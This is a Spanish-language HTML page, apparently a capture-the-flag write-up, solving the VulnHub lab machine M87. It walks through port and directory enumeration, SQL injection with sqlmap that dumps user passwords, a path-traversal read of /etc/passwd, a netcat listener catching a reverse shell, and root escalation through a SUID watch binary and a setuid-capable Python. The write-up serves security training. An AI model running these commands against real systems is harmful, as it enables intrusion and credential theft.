@@ -1,0 +1,270 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup M87 VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup M87 VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina M87 de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina M87 de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup M87 VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup M87 VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina M87 de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup M87 VulnHub</h1>
+          <p>Resolución de la máquina M87 de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.15
+Nmap scan report for 192.168.100.15
+PORT     STATE    SERVICE
+80/tcp   open     http
+9090/tcp open     zeus-admin</span>
+</code></pre></div></div>
+
+<div><p>Si damos un vistazo a la web nos encontramos con un panel de login</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Como no tenemos credenciales podemos buscar directorios y encontramos admin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 192.168.100.15 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://192.168.100.15
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/admin</span><span class="p">                (Status: 301) [Size: 316] [--> http://192.168.100.15/admin/]
+/assets               (Status: 301) [Size: 317] [--> http://192.168.100.15/assets/]</span>
+</code></pre></div></div>
+
+<div><p>Si ahora jugamos sobre admin encontramos el directorio backup</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 192.168.100.15/admin -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://192.168.100.15/admin
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 323] [--> http://192.168.100.15/admin/images/]
+/js                   (Status: 301) [Size: 319] [--> http://192.168.100.15/admin/js/]    
+/css                  (Status: 301) [Size: 320] [--> http://192.168.100.15/admin/css/]   
+</span><span class="kd">/backup</span><span class="p">               (Status: 301) [Size: 323] [--> http://192.168.100.15/admin/backup/]</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un login, en el cual se tramita la data por GET</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Con wfuzz podemos buscar parametros además de username y pass, y parece que id existe</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -u "192.168.100.15/admin/backup/?FUZZ=" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 100 --hh 4412
+
+Target: http://192.168.100.15/admin/backup/?FUZZ=
+Total requests: 2588
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000001:   </span><span class="s2">200</span><span class="p">        87 L     190 W      4560 Ch     "</span><span class="kd">id</span><span class="p">"</span>
+</code></pre></div></div>
+
+<div><p>Si le enviamos un 1 a el parametro, podemos ver el usuario jack</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://192.168.100.15/admin/backup/?id=1"</span><span class="p"> |</span><span class="s2"> html2text</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> -v</span><span class="no"> "^$"</span><span class="p">
+</span><span class="kd">jack</span><span class="p">
+[username            ]
+[********************]
+
+Login</span>
+</code></pre></div></div>
+
+<div><p>Pero al enviarle una comilla podemos ver un error de sql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://192.168.100.15/admin/backup/?id='" </span><span class="p">|</span><span class="s2"> html2text</span><span class="p"> |</span><span class="s2"> grep</span><span class="p"> -v </span><span class="no">"^$"</span><span class="p">
+You have an error in your SQL syntax; check the manual that corresponds to your
+MariaDB server version for the right syntax to use near ''' at line 1
+[username            ]
+[********************]
+
+Login</span>
+</code></pre></div></div>
+
+<div><p>Con sqlmap podemos intentar ver las bases de datos existentes, parece interesante db</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> --url </span><span class="no">"http://192.168.100.15/admin/backup/?id=1"</span><span class="p"> -dbs --batch
+[</span><span class="s2">INFO</span><span class="p">] fetching database names
+available databases [4]:
+[*] db
+[*] information_schema
+[*] mysql
+[*] performance_schema</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos dumpear la base de datos y encontramos credenciales entre ellas las de admin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> --url </span><span class="no">"http://192.168.100.15/admin/backup/?id=1"</span><span class="p"> -D db --dump --batch
+[</span><span class="s2">INFO</span><span class="p">] fetching entries for table 'users' in database 'db'
+Database: db
+Table: users
+[10 entries]
++----+--------------------+-----------------+----------+
+| id | email              | password        | username |
++----+--------------------+-----------------+----------+
+| 1  | jack@localhost     | gae5g5a         | jack     |
+| 2  | ceo@localhost      | 5t96y4i95y      | ceo      |
+| 3  | brad@localhost     | gae5g5a         | brad     |
+| 4  | expenses@localhost | 5t96y4i95y      | expenses |
+| 5  | julia@localhost    | fw54vrfwe45     | julia    |
+| 6  | mike@localhost     | 4kworw4         | mike     |
+| 7  | adrian@localhost   | fw54vrfwe45     | adrian   |
+| 8  | john@localhost     | 4kworw4         | john     |
+| </span><span class="kd">9</span><span class="p">  | </span><span class="kd">admin@localhost</span><span class="p">    | </span><span class="kd">15The4Dm1n4L1f3</span><span class="p"> | </span><span class="kd">admin</span><span class="p">    |
+| 10 | alex@localhost     | dsfsrw4         | alex     |
++----+--------------------+-----------------+----------+</span>
+</code></pre></div></div>
+
+<div><p>Al probar parametros basicos como file podemos ver un lfi, y el usuario charlotte</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "192.168.100.15/admin/backup/?file=../../../../../../etc/passwd" </span><span class="p">| </span><span class="s2">grep </span><span class="p">sh$
+root:x:0:0:root:/root:/bin/bash
+</span><span class="kd">charlotte</span><span class="p">:x:1000:1000:charlotte,,,:/home/charlotte:/bin/bash</span>
+</code></pre></div></div>
+
+<div><p>La contraseña 15The4Dm1n4L1f3 funciona con charlotte en el puerto 9090</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Al autenticarnos podemos ver en la esquina inferior izquierda una pestaña terminal</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Ya que tenemos una terminal podemos enviarnos una shell para mas comodidad</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Recibimos la shell y podemos ver la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 192.168.100.15
+script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ whoami
+charlotte
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.15 
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat local.txt 
+29247ebdec52ba0b9a6fd10d68f6b91f
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En este punto podemos encontrar 2 caminos para root primero buscando binarios suid</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/sbin/exim4
+</span><span class="kd">/usr/bin/watch</span><span class="p">
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/pkexec
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Además del pkexec podemos ver watch, tirando de <a href="https://gtfobins.github.io/gtfobins/watch/">gtfobins</a> nos podemos convertir en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ watch -x bash -p -c 'reset; exec bash -p 1>&0 2>&0'
+bash-5.0# whoami
+root
+bash-5.0# hostname -I
+192.168.100.15 
+bash-5.0#</span>
+</code></pre></div></div>
+
+<div><p>La segunda es buscando capabilities, encontramos cap_setuid+ep en old</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$ getcap -r / 2>/dev/null
+/usr/bin/old = </span><span class="kd">cap_setuid+ep</span><span class="p">
+/usr/bin/ping = cap_net_raw+ep
+</span><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo vemos que es python asi que tirando de <a href="https://gtfobins.github.io/gtfobins/python/">gtfobins</a> nos convertimos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">charlotte@M87</span><span class="p">:</span><span class="na">~</span><span class="p">$  old
+Python 2.7.16
+</span><span class="kd">>>></span><span class="p"> import os
+</span><span class="kd">>>></span><span class="p"> os.setuid(0)
+</span><span class="kd">>>></span><span class="p"> os.system("su")
+</span><span class="s2">root@M87</span><span class="p">:</span><span class="na">/home/charlotte</span><span class="p"># cd
+</span><span class="s2">root@M87</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@M87</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+192.168.100.15 
+</span><span class="s2">root@M87</span><span class="p">:</span><span class="na">~</span><span class="p"># cat proof.txt 
+
+MMMMMMMM               MMMMMMMM     888888888     77777777777777777777
+M:::::::M             M:::::::M   88:::::::::88   7::::::::::::::::::7
+M::::::::M           M::::::::M 88:::::::::::::88 7::::::::::::::::::7
+M:::::::::M         M:::::::::M8::::::88888::::::8777777777777:::::::7
+M::::::::::M       M::::::::::M8:::::8     8:::::8           7::::::7
+M:::::::::::M     M:::::::::::M8:::::8     8:::::8          7::::::7
+M:::::::M::::M   M::::M:::::::M 8:::::88888:::::8          7::::::7
+M::::::M M::::M M::::M M::::::M  8:::::::::::::8          7::::::7
+M::::::M  M::::M::::M  M::::::M 8:::::88888:::::8        7::::::7
+M::::::M   M:::::::M   M::::::M8:::::8     8:::::8      7::::::7
+M::::::M    M:::::M    M::::::M8:::::8     8:::::8     7::::::7
+M::::::M     MMMMM     M::::::M8:::::8     8:::::8    7::::::7
+M::::::M               M::::::M8::::::88888::::::8   7::::::7
+M::::::M               M::::::M 88:::::::::::::88   7::::::7
+M::::::M               M::::::M   88:::::::::88    7::::::7
+MMMMMMMM               MMMMMMMM     888888888     77777777
+
+Congratulations!
+You've rooted m87!
+
+21e5e63855f249bcd1b4b093af669b1e
+
+mindsflee
+
+</span><span class="s2">root@M87</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
